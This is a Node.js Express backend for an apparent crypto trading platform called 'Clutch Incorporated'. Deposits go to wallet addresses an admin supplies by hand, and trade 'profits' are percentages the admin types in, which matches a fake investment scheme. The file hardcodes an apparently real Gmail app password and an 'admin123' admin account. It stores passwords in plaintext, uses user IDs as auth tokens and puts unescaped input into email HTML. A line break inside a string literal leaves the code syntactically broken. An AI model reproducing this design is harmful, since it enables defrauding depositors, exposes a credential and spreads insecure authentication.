const express = require('express');
const cors = require('cors');
const path = require('path');
const nodemailer = require('nodemailer');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('.'));

// Users storage
let users = [
  {
    id: 'admin1',
    email: 'admin@clutch.com',
    password: 'admin123',
    balance: 0,
    withdrawLimit: 0,
    isAdmin: true,
    isVerified: true,
    twoFactorSecret: null,
    createdAt: new Date()
  }
];

// OTP storage for registration
let otpStorage = {};

// Deposit requests storage
let depositRequests = [];

// Withdrawal requests storage
let withdrawalRequests = [];

// Orders storage
let orders = [];

// Email configuration - UPDATE THESE WITH YOUR EMAIL
const transporter = nodemailer.createTransport({
  host: 'smtp.gmail.com',
  port: 465,
  secure: true,
  auth: {
    user: 'jeframw2@gmail.com', // CHANGE THIS
    pass: 'zvkhabcuignsishf
' // CHANGE THIS
  }
});

// Generate OTP
function generateOTP() {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

// Send email function
async function sendEmail(to, subject, html) {
  try {
    await transporter.sendMail({
      from: '"Clutch Incorporated" <noreply@clutch.com>',
      to: to,
      subject: subject,
      html: html
    });
    return true;
  } catch (error) {
    console.error('Email error:', error);
    return false;
  }
}

// ============ HTML PAGES ============
app.get('/admin-login', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin-login.html'));
});

app.get('/admin-dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin-dashboard.html'));
});

app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'dashboard.html'));
});

app.get('/trading', (req, res) => {
  res.sendFile(path.join(__dirname, 'trading.html'));
});

app.get('/wallet', (req, res) => {
  res.sendFile(path.join(__dirname, 'wallet.html'));
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// ============ API ENDPOINTS ============
app.get('/health', (req, res) => {
  res.json({ status: 'healthy' });
});

// Send OTP for registration
app.post('/api/send-otp', async (req, res) => {
  const { email } = req.body;
  
  const existingUser = users.find(u => u.email === email);
  if (existingUser) {
    return res.status(400).json({ message: 'Email already registered' });
  }
  
  const otp = generateOTP();
  otpStorage[email] = { otp, expiresAt: Date.now() + 5 * 60 * 1000 };
  
  const html = `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
      <h2 style="color: #e74c3c;">Clutch Incorporated</h2>
      <h3>Email Verification</h3>
      <p>Your OTP for registration is:</p>
      <h1 style="font-size: 48px; color: #e74c3c; letter-spacing: 5px;">${otp}</h1>
      <p>This OTP is valid for 5 minutes.</p>
      <hr>
      <p style="color: #888; font-size: 12px;">Clutch Incorporated - Crypto Trading Platform</p>
    </div>
  `;
  
  const sent = await sendEmail(email, 'Verify Your Email - Clutch Incorporated', html);
  
  if (sent) {
    res.json({ message: 'OTP sent to your email' });
  } else {
    res.status(500).json({ message: 'Failed to send email. Please check email configuration.' });
  }
});

// Verify OTP and complete registration
app.post('/api/verify-otp', (req, res) => {
  const { email, otp, password } = req.body;
  
  const storedOTP = otpStorage[email];
  
  if (!storedOTP) {
    return res.status(400).json({ message: 'No OTP requested. Please request OTP first.' });
  }
  
  if (Date.now() > storedOTP.expiresAt) {
    delete otpStorage[email];
    return res.status(400).json({ message: 'OTP expired. Please request a new one.' });
  }
  
  if (storedOTP.otp !== otp) {
    return res.status(400).json({ message: 'Invalid OTP' });
  }
  
  const newUser = {
    id: Date.now().toString(),
    email: email,
    password: password,
    balance: 0,
    withdrawLimit: 1000,
    isAdmin: false,
    isVerified: true,
    twoFactorSecret: null,
    createdAt: new Date()
  };
  
  users.push(newUser);
  delete otpStorage[email];
  
  const welcomeHtml = `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
      <h2 style="color: #e74c3c;">Welcome to Clutch Incorporated!</h2>
      <p>Your account has been successfully verified and created.</p>
      <p>You can now start trading with live market prices.</p>
      <hr>
      <p style="color: #888; font-size: 12px;">Clutch Incorporated - Crypto Trading Platform</p>
    </div>
  `;
  sendEmail(email, 'Welcome to Clutch Incorporated', welcomeHtml);
  
  res.json({ 
    message: 'Registration successful', 
    token: newUser.id,
    user: { 
      email: email, 
      balance: 0,
      withdrawLimit: 1000
    }
  });
});

// Login
app.post('/api/login', (req, res) => {
  const { email, password } = req.body;
  
  const user = users.find(u => u.email === email && u.password === password);
  
  if (!user) {
    return res.status(401).json({ message: 'Invalid credentials' });
  }
  
  const loginHtml = `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
      <h2 style="color: #e74c3c;">New Login Detected</h2>
      <p>Your account was just logged into at ${new Date().toLocaleString()}</p>
      <p>If this wasn't you, please contact support immediately.</p>
      <hr>
      <p style="color: #888; font-size: 12px;">Clutch Incorporated - Crypto Trading Platform</p>
    </div>
  `;
  sendEmail(email, 'New Login to Your Account', loginHtml);
  
  res.json({ 
    message: 'Login successful', 
    token: user.id,
    user: { 
      email: user.email, 
      balance: user.balance,
      withdrawLimit: user.withdrawLimit,
      isAdmin: user.isAdmin || false
    }
  });
});

// Enable 2FA for user
app.post('/api/enable-2fa', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  const { secret } = req.body;
  
  const user = users.find(u => u.id === token);
  if (!user) {
    return res.status(401).json({ message: 'Unauthorized' });
  }
  
  user.twoFactorSecret = secret;
  
  const html = `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
      <h2 style="color: #e74c3c;">2FA Enabled</h2>
      <p>Two-Factor Authentication has been enabled on your account.</p>
      <p>If you didn't do this, please contact support immediately.</p>
      <hr>
      <p style="color: #888; font-size: 12px;">Clutch Incorporated - Crypto Trading Platform</p>
    </div>
  `;
  sendEmail(user.email, '2FA Enabled on Your Account', html);
  
  res.json({ message: '2FA enabled successfully' });
});

// Get user info
app.get('/api/user-info', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ message: 'Unauthorized' });
  }
  
  const user = users.find(u => u.id === token);
  
  if (!user) {
    return res.status(401).json({ message: 'Invalid token' });
  }
  
  res.json({ 
    balance: user.balance,
    withdrawLimit: user.withdrawLimit,
    email: user.email,
    has2FA: !!user.twoFactorSecret
  });
});

// ============ DEPOSIT REQUEST ============
app.post('/api/request-deposit', async (req, res) => {
  const { amount, walletType } = req.body;
  const token = req.headers.authorization?.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ message: 'Unauthorized' });
  }
  
  const user = users.find(u => u.id === token);
  
  if (!user) {
    return res.status(401).json({ message: 'Invalid token' });
  }
  
  if (!amount || amount <= 0) {
    return res.status(400).json({ message: 'Invalid amount' });
  }
  
  const newRequest = {
    id: Date.now().toString(),
    userId: user.id,
    userEmail: user.email,
    amount: amount,
    walletType: walletType || 'Not specified',
    status: 'pending',
    adminWallet: null,
    createdAt: new Date()
  };
  
  depositRequests.push(newRequest);
  
  const adminHtml = `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
      <h2 style="color: #e74c3c;">New Deposit Request</h2>
      <p><strong>User:</strong> ${user.email}</p>
      <p><strong>Amount:</strong> $${amount}</p>
      <p><strong>Wallet Type:</strong> ${walletType}</p>
      <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
      <hr>
      <p style="color: #888; font-size: 12px;">Clutch Incorporated - Admin Notification</p>
    </div>
  `;
  sendEmail('admin@clutch.com', 'New Deposit Request', adminHtml);
  
  res.json({ 
    message: `Deposit request for $${amount} submitted. Wallet: ${walletType}`,
    requestId: newRequest.id,
    status: 'pending'
  });
});

// ============ WITHDRAWAL REQUEST ============
app.post('/api/request-withdraw', async (req, res) => {
  const { amount, walletAddress, walletType } = req.body;
  const token = req.headers.authorization?.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ message: 'Unauthorized' });
  }
  
  const user = users.find(u => u.id === token);
  
  if (!user) {
    return res.status(401).json({ message: 'Invalid token' });
  }
  
  if (!amount || amount <= 0) {
    return res.status(400).json({ message: 'Invalid amount' });
  }
  
  if (amount > user.withdrawLimit) {
    return res.status(400).json({ 
      message: `Withdrawal limit exceeded. Your limit is $${user.withdrawLimit}` 
    });
  }
  
  if (user.balance < amount) {
    return res.status(400).json({ message: 'Insufficient balance' });
  }
  
  if (!walletAddress) {
    return res.status(400).json({ message: 'Wallet address required' });
  }
  
  const newRequest = {
    id: Date.now().toString(),
    userId: user.id,
    userEmail: user.email,
    amount: amount,
    walletAddress: walletAddress,
    walletType: walletType || 'Not specified',
    status: 'pending',
    createdAt: new Date()
  };
  
  withdrawalRequests.push(newRequest);
  
  const adminHtml = `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
      <h2 style="color: #e74c3c;">New Withdrawal Request</h2>
      <p><strong>User:</strong> ${user.email}</p>
      <p><strong>Amount:</strong> $${amount}</p>
      <p><strong>Wallet Type:</strong> ${walletType}</p>
      <p><strong>Wallet Address:</strong> ${walletAddress}</p>
      <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
      <hr>
      <p style="color: #888; font-size: 12px;">Clutch Incorporated - Admin Notification</p>
    </div>
  `;
  sendEmail('admin@clutch.com', 'New Withdrawal Request', adminHtml);
  
  res.json({ 
    message: `Withdrawal request for $${amount} submitted. Wallet: ${walletType}`,
    requestId: newRequest.id,
    status: 'pending'
  });
});

// ============ ADMIN: Get all withdrawal requests ============
app.get('/api/admin/withdrawal-requests', (req, res) => {
  const adminToken = req.headers.authorization?.split(' ')[1];
  
  const admin = users.find(u => u.id === adminToken && u.isAdmin === true);
  if (!admin) {
    return res.status(403).json({ message: 'Admin access required' });
  }
  
  res.json({ requests: withdrawalRequests });
});

// ============ ADMIN: Approve withdrawal ============
app.post('/api/admin/approve-withdrawal', async (req, res) => {
  const { requestId } = req.body;
  const adminToken = req.headers.authorization?.split(' ')[1];
  
  const admin = users.find(u => u.id === adminToken && u.isAdmin === true);
  if (!admin) {
    return res.status(403).json({ message: 'Admin access required' });
  }
  
  const request = withdrawalRequests.find(r => r.id === requestId);
  if (!request) {
    return res.status(404).json({ message: 'Request not found' });
  }
  
  if (request.status !== 'pending') {
    return res.status(400).json({ message: 'Request already processed' });
  }
  
  const user = users.find(u => u.id === request.userId);
  if (!user) {
    return res.status(404).json({ message: 'User not found' });
  }
  
  if (user.balance < request.amount) {
    return res.status(400).json({ message: 'Insufficient balance now' });
  }
  
  user.balance -= request.amount;
  
  request.status = 'approved';
  request.approvedAt = new Date();
  request.approvedBy = admin.id;
  
  const clientHtml = `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
      <h2 style="color: #e74c3c;">Withdrawal Approved</h2>
      <p>Your withdrawal request has been approved!</p>
      <p><strong>Amount:</strong> $${request.amount}</p>
      <p><strong>Wallet:</strong> ${request.walletType}</p>
      <p><strong>Address:</strong> ${request.walletAddress.substring(0, 20)}...</p>
      <hr>
      <p style="color: #888; font-size: 12px;">Clutch Incorporated - Crypto Trading Platform</p>
    </div>
  `;
  sendEmail(user.email, 'Withdrawal Approved', clientHtml);
  
  res.json({ 
    message: `Withdrawal of $${request.amount} approved. Wallet: ${request.walletType}`,
    newBalance: user.balance
  });
});

// ============ ADMIN: Reject withdrawal ============
app.post('/api/admin/reject-withdrawal', async (req, res) => {
  const { requestId, reason } = req.body;
  const adminToken = req.headers.authorization?.split(' ')[1];
  
  const admin = users.find(u => u.id === adminToken && u.isAdmin === true);
  if (!admin) {
    return res.status(403).json({ message: 'Admin access required' });
  }
  
  const request = withdrawalRequests.find(r => r.id === requestId);
  if (!request) {
    return res.status(404).json({ message: 'Request not found' });
  }
  
  request.status = 'rejected';
  request.rejectionReason = reason;
  request.rejectedAt = new Date();
  
  const user = users.find(u => u.id === request.userId);
  if (user) {
    const clientHtml = `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
        <h2 style="color: #e74c3c;">Withdrawal Rejected</h2>
        <p>Your withdrawal request has been rejected.</p>
        <p><strong>Amount:</strong> $${request.amount}</p>
        <p><strong>Reason:</strong> ${reason}</p>
        <hr>
        <p style="color: #888; font-size: 12px;">Clutch Incorporated - Crypto Trading Platform</p>
      </div>
    `;
    sendEmail(user.email, 'Withdrawal Rejected', clientHtml);
  }
  
  res.json({ message: `Withdrawal request rejected` });
});

// ============ CLIENT: Get withdrawal requests ============
app.get('/api/my-withdrawal-requests', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ message: 'Unauthorized' });
  }
  
  const user = users.find(u => u.id === token);
  
  if (!user) {
    return res.status(401).json({ message: 'Invalid token' });
  }
  
  const userRequests = withdrawalRequests.filter(r => r.userId === user.id);
  
  res.json({ requests: userRequests });
});

// ============ ADMIN: Provide wallet address for deposit ============
app.post('/api/admin/provide-wallet', async (req, res) => {
  const { requestId, walletAddress } = req.body;
  const adminToken = req.headers.authorization?.split(' ')[1];
  
  const admin = users.find(u => u.id === adminToken && u.isAdmin === true);
  if (!admin) {
    return res.status(403).json({ message: 'Admin access required' });
  }
  
  const request = depositRequests.find(r => r.id === requestId);
  if (!request) {
    return res.status(404).json({ message: 'Request not found' });
  }
  
  if (request.status !== 'pending') {
    return res.status(400).json({ message: 'Request already processed' });
  }
  
  request.adminWallet = walletAddress;
  request.status = 'waiting_payment';
  
  const user = users.find(u => u.id === request.userId);
  if (user) {
    const clientHtml = `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
        <h2 style="color: #e74c3c;">Deposit Wallet Address Provided</h2>
        <p>Please send funds to:</p>
        <div style="background: #f0f0f0; padding: 15px; border-radius: 8px; font-family: monospace; word-break: break-all;">
          ${walletAddress}
        </div>
        <p><strong>Amount:</strong> $${request.amount}</p>
        <p><strong>Wallet Type:</strong> ${request.walletType}</p>
        <hr>
        <p style="color: #888; font-size: 12px;">Clutch Incorporated - Crypto Trading Platform</p>
      </div>
    `;
    sendEmail(user.email, 'Deposit Wallet Address Ready', clientHtml);
  }
  
  res.json({ 
    message: `Wallet address provided for ${request.walletType}`,
    request: request
  });
});

// ============ CLIENT: Get deposit requests ============
app.get('/api/my-deposit-requests', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ message: 'Unauthorized' });
  }
  
  const user = users.find(u => u.id === token);
  
  if (!user) {
    return res.status(401).json({ message: 'Invalid token' });
  }
  
  const userRequests = depositRequests.filter(r => r.userId === user.id);
  
  res.json({ requests: userRequests });
});

// ============ CLIENT: Confirm payment sent ============
app.post('/api/confirm-payment', async (req, res) => {
  const { requestId, transactionId } = req.body;
  const token = req.headers.authorization?.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ message: 'Unauthorized' });
  }
  
  const user = users.find(u => u.id === token);
  
  if (!user) {
    return res.status(401).json({ message: 'Invalid token' });
  }
  
  const request = depositRequests.find(r => r.id === requestId);
  if (!request) {
    return res.status(404).json({ message: 'Request not found' });
  }
  
  if (request.userId !== user.id) {
    return res.status(403).json({ message: 'Unauthorized' });
  }
  
  if (request.status !== 'waiting_payment') {
    return res.status(400).json({ message: 'Invalid request status' });
  }
  
  request.status = 'payment_sent';
  request.transactionId = transactionId;
  request.paymentSentAt = new Date();
  
  const adminHtml = `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
      <h2 style="color: #e74c3c;">Payment Confirmation Received</h2>
      <p><strong>User:</strong> ${user.email}</p>
      <p><strong>Amount:</strong> $${request.amount}</p>
      <p><strong>Wallet Type:</strong> ${request.walletType}</p>
      <p><strong>Transaction ID:</strong> ${transactionId}</p>
      <hr>
      <p style="color: #888; font-size: 12px;">Clutch Incorporated - Admin Notification</p>
    </div>
  `;
  sendEmail('admin@clutch.com', 'Payment Confirmation Received', adminHtml);
  
  res.json({ message: `Payment confirmation submitted.` });
});

// ============ ADMIN: Confirm deposit ============
app.post('/api/admin/confirm-deposit', async (req, res) => {
  const { requestId } = req.body;
  const adminToken = req.headers.authorization?.split(' ')[1];
  
  const admin = users.find(u => u.id === adminToken && u.isAdmin === true);
  if (!admin) {
    return res.status(403).json({ message: 'Admin access required' });
  }
  
  const request = depositRequests.find(r => r.id === requestId);
  if (!request) {
    return res.status(404).json({ message: 'Request not found' });
  }
  
  if (request.status !== 'payment_sent') {
    return res.status(400).json({ message: 'Payment not confirmed by client yet' });
  }
  
  const user = users.find(u => u.id === request.userId);
  if (!user) {
    return res.status(404).json({ message: 'User not found' });
  }
  
  user.balance += request.amount;
  
  request.status = 'completed';
  request.completedAt = new Date();
  
  const clientHtml = `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
      <h2 style="color: #e74c3c;">Deposit Confirmed!</h2>
      <p>Your deposit of $${request.amount} has been confirmed and added to your account.</p>
      <p><strong>New Balance:</strong> $${user.balance.toFixed(2)}</p>
      <hr>
      <p style="color: #888; font-size: 12px;">Clutch Incorporated - Crypto Trading Platform</p>
    </div>
  `;
  sendEmail(user.email, 'Deposit Confirmed', clientHtml);
  
  res.json({ 
    message: `Deposit of $${request.amount} confirmed. Wallet: ${request.walletType}`,
    newBalance: user.balance
  });
});

// ============ ADMIN: Reject deposit ============
app.post('/api/admin/reject-deposit', async (req, res) => {
  const { requestId, reason } = req.body;
  const adminToken = req.headers.authorization?.split(' ')[1];
  
  const admin = users.find(u => u.id === adminToken && u.isAdmin === true);
  if (!admin) {
    return res.status(403).json({ message: 'Admin access required' });
  }
  
  const request = depositRequests.find(r => r.id === requestId);
  if (!request) {
    return res.status(404).json({ message: 'Request not found' });
  }
  
  request.status = 'rejected';
  request.rejectionReason = reason;
  
  const user = users.find(u => u.id === request.userId);
  if (user) {
    const clientHtml = `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
        <h2 style="color: #e74c3c;">Deposit Request Rejected</h2>
        <p>Your deposit request has been rejected.</p>
        <p><strong>Amount:</strong> $${request.amount}</p>
        <p><strong>Reason:</strong> ${reason}</p>
        <hr>
        <p style="color: #888; font-size: 12px;">Clutch Incorporated - Crypto Trading Platform</p>
      </div>
    `;
    sendEmail(user.email, 'Deposit Request Rejected', clientHtml);
  }
  
  res.json({ message: `Deposit request rejected` });
});

// ============ ADMIN: Get all deposit requests ============
app.get('/api/admin/deposit-requests', (req, res) => {
  const adminToken = req.headers.authorization?.split(' ')[1];
  
  const admin = users.find(u => u.id === adminToken && u.isAdmin === true);
  if (!admin) {
    return res.status(403).json({ message: 'Admin access required' });
  }
  
  res.json({ requests: depositRequests });
});

// ============ ADMIN: Get pending executions ============
app.get('/api/admin/pending-executions', (req, res) => {
  const adminToken = req.headers.authorization?.split(' ')[1];
  
  const admin = users.find(u => u.id === adminToken && u.isAdmin === true);
  if (!admin) {
    return res.status(403).json({ message: 'Admin access required' });
  }
  
  const pendingOrders = orders.filter(o => o.status === 'pending_execution');
  
  res.json({ orders: pendingOrders });
});

// ============ ADMIN: Approve order execution ============
app.post('/api/admin/approve-execution', async (req, res) => {
  const { orderId, profitPercentage } = req.body;
  const adminToken = req.headers.authorization?.split(' ')[1];
  
  const admin = users.find(u => u.id === adminToken && u.isAdmin === true);
  if (!admin) {
    return res.status(403).json({ message: 'Admin access required' });
  }
  
  const order = orders.find(o => o.id === orderId);
  if (!order) {
    return res.status(404).json({ message: 'Order not found' });
  }
  
  if (order.status !== 'pending_execution') {
    return res.status(400).json({ message: 'Order not ready for execution' });
  }
  
  const user = users.find(u => u.id === order.userId);
  if (!user) {
    return res.status(404).json({ message: 'User not found' });
  }
  
  let profit = 0;
  
  if (profitPercentage) {
    profit = (order.amount * parseFloat(profitPercentage)) / 100;
  }
  
  if (order.side === 'buy') {
    user.balance += profit;
  } else {
    user.balance += profit;
  }
  
  order.status = 'executed';
  order.executedAt = new Date();
  order.profit = profit;
  order.profitPercentage = profitPercentage || 0;
  order.executedBy = admin.id;
  
  const clientHtml = `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
      <h2 style="color: #e74c3c;">Order Executed</h2>
      <p>Your order has been executed!</p>
      <p><strong>Symbol:</strong> ${order.symbol}/USD</p>
      <p><strong>Side:</strong> ${order.side.toUpperCase()}</p>
      <p><strong>Amount:</strong> $${order.amount}</p>
      <p><strong>Price:</strong> $${order.price}</p>
      <p><strong>Profit/Loss:</strong> ${profitPercentage}% ($${profit.toFixed(2)})</p>
      <p><strong>New Balance:</strong> $${user.balance.toFixed(2)}</p>
      <hr>
      <p style="color: #888; font-size: 12px;">Clutch Incorporated - Crypto Trading Platform</p>
    </div>
  `;
  sendEmail(user.email, 'Order Executed', clientHtml);
  
  res.json({ 
    message: `Order executed with ${profitPercentage}% profit/loss. Profit: $${profit.toFixed(2)}`,
    newBalance: user.balance,
    profit: profit
  });
});

// ============ ADMIN: Reject order execution ============
app.post('/api/admin/reject-execution', async (req, res) => {
  const { orderId, reason } = req.body;
  const adminToken = req.headers.authorization?.split(' ')[1];
  
  const admin = users.find(u => u.id === adminToken && u.isAdmin === true);
  if (!admin) {
    return res.status(403).json({ message: 'Admin access required' });
  }
  
  const order = orders.find(o => o.id === orderId);
  if (!order) {
    return res.status(404).json({ message: 'Order not found' });
  }
  
  if (order.status !== 'pending_execution') {
    return res.status(400).json({ message: 'Order not ready for execution' });
  }
  
  order.status = 'rejected';
  order.rejectionReason = reason;
  order.rejectedAt = new Date();
  
  if (order.side === 'buy') {
    const user = users.find(u => u.id === order.userId);
    if (user) {
      user.balance += order.amount;
      
      const clientHtml = `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
          <h2 style="color: #e74c3c;">Order Rejected</h2>
          <p>Your order has been rejected.</p>
          <p><strong>Symbol:</strong> ${order.symbol}/USD</p>
          <p><strong>Amount:</strong> $${order.amount}</p>
          <p><strong>Reason:</strong> ${reason}</p>
          <p><strong>Refunded Amount:</strong> $${order.amount}</p>
          <hr>
          <p style="color: #888; font-size: 12px;">Clutch Incorporated - Crypto Trading Platform</p>
        </div>
      `;
      sendEmail(user.email, 'Order Rejected - Refund Issued', clientHtml);
    }
  }
  
  res.json({ message: 'Order execution rejected and refunded' });
});

// ============ ADMIN: Get all users ============
app.get('/api/admin/users', (req, res) => {
  const adminToken = req.headers.authorization?.split(' ')[1];
  
  const admin = users.find(u => u.id === adminToken && u.isAdmin === true);
  if (!admin) {
    return res.status(403).json({ message: 'Admin access required' });
  }
  
  const nonAdmins = users.filter(u => !u.isAdmin);
  
  res.json({
    users: nonAdmins.map(u => ({
      id: u.id,
      email: u.email,
      balance: u.balance,
      withdrawLimit: u.withdrawLimit,
      has2FA: !!u.twoFactorSecret,
      createdAt: u.createdAt
    })),
    totalUsers: nonAdmins.length,
    totalBalance: nonAdmins.reduce((sum, u) => sum + u.balance, 0)
  });
});

// ============ ADMIN: Update withdrawal limit ============
app.post('/api/admin/update-limit', (req, res) => {
  const { userId, newLimit } = req.body;
  const adminToken = req.headers.authorization?.split(' ')[1];
  
  const admin = users.find(u => u.id === adminToken && u.isAdmin === true);
  if (!admin) {
    return res.status(403).json({ message: 'Admin access required' });
  }
  
  const user = users.find(u => u.id === userId);
  if (!user) {
    return res.status(404).json({ message: 'User not found' });
  }
  
  if (!newLimit || newLimit < 0) {
    return res.status(400).json({ message: 'Invalid limit amount' });
  }
  
  user.withdrawLimit = newLimit;
  
  res.json({ 
    message: `Withdrawal limit updated to $${newLimit}`,
    newLimit: user.withdrawLimit
  });
});

// Dashboard data
app.get('/api/dashboard', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ message: 'Unauthorized' });
  }
  
  const user = users.find(u => u.id === token);
  
  if (!user) {
    return res.status(401).json({ message: 'Invalid token' });
  }
  
  res.json({ 
    user: { 
      email: user.email, 
      balance: user.balance,
      withdrawLimit: user.withdrawLimit,
      has2FA: !!user.twoFactorSecret
    }
  });
});

// ============ TRADING ENDPOINTS ============

app.post('/api/place-order', (req, res) => {
  const { symbol, type, side, amount, price, currentPrice, timeframe } = req.body;
  const token = req.headers.authorization?.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ message: 'Unauthorized' });
  }
  
  const user = users.find(u => u.id === token);
  
  if (!user) {
    return res.status(401).json({ message: 'Invalid token' });
  }
  
  if (!amount || amount <= 0) {
    return res.status(400).json({ message: 'Invalid amount' });
  }
  
  if (side === 'buy') {
    if (user.balance < amount) {
      return res.status(400).json({ message: 'Insufficient balance' });
    }
    
    user.balance -= amount;
    const newOrder = {
      id: Date.now().toString(),
      userId: user.id,
      userEmail: user.email,
      symbol: symbol,
      type: type,
      side: side,
      amount: amount,
      price: price,
      filled: 0,
      status: 'open',
      timeframe: timeframe || 60,
      createdAt: new Date()
    };
    orders.push(newOrder);
    
    return res.json({ 
      message: `Limit ${side} order placed for $${amount} at $${price}. Will execute in ${timeframe} minutes.`,
      orderId: newOrder.id
    });
  } else {
    const newOrder = {
      id: Date.now().toString(),
      userId: user.id,
      userEmail: user.email,
      symbol: symbol,
      type: type,
      side: side,
      amount: amount,
      price: price,
      filled: 0,
      status: 'open',
      timeframe: timeframe || 60,
      createdAt: new Date()
    };
    orders.push(newOrder);
    
    return res.json({ 
      message: `Limit ${side} order placed for $${amount} at $${price}. Will execute in ${timeframe} minutes.`,
      orderId: newOrder.id
    });
  }
});

// Get open orders
app.get('/api/open-orders', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ message: 'Unauthorized' });
  }
  
  const user = users.find(u => u.id === token);
  
  if (!user) {
    return res.status(401).json({ message: 'Invalid token' });
  }
  
  const userOrders = orders.filter(o => o.userId === user.id && (o.status === 'open' || o.status === 'pending_execution'));
  
  res.json({ orders: userOrders });
});

// Get order history
app.get('/api/order-history', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ message: 'Unauthorized' });
  }
  
  const user = users.find(u => u.id === token);
  
  if (!user) {
    return res.status(401).json({ message: 'Invalid token' });
  }
  
  const userOrders = orders.filter(o => o.userId === user.id && o.status !== 'open').sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
  
  res.json({ orders: userOrders });
});

// Cancel order
app.delete('/api/cancel-order/:orderId', (req, res) => {
  const { orderId } = req.params;
  const token = req.headers.authorization?.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ message: 'Unauthorized' });
  }
  
  const user = users.find(u => u.id === token);
  
  if (!user) {
    return res.status(401).json({ message: 'Invalid token' });
  }
  
  const orderIndex = orders.findIndex(o => o.id === orderId && o.userId === user.id);
  
  if (orderIndex === -1) {
    return res.status(404).json({ message: 'Order not found' });
  }
  
  const order = orders[orderIndex];
  
  if (order.status === 'open') {
    if (order.side === 'buy') {
      user.balance += order.amount;
    }
    order.status = 'cancelled';
  } else {
    return res.status(400).json({ message: 'Order cannot be cancelled' });
  }
  
  res.json({ message: 'Order cancelled', newBalance: user.balance });
});

// ============ ALL ORDERS (Admin view) ============
app.get('/api/admin/all-orders', (req, res) => {
  const adminToken = req.headers.authorization?.split(' ')[1];
  
  const admin = users.find(u => u.id === adminToken && u.isAdmin === true);
  if (!admin) {
    return res.status(403).json({ message: 'Admin access required' });
  }
  
  const allOrders = orders.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
  
  res.json({ orders: allOrders });
});

// Check for expired timeframes (run every 30 seconds)
setInterval(() => {
  const now = new Date();
  orders.forEach(order => {
    if (order.status === 'open' && order.timeframe) {
      const createdTime = new Date(order.createdAt);
      const expiryTime = new Date(createdTime.getTime() + (order.timeframe * 60 * 1000));
      
      if (now >= expiryTime) {
        order.status = 'pending_execution';
        console.log(`Order ${order.id} ready for admin execution`);
      }
    }
  });
}, 30000);

// Start server
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
});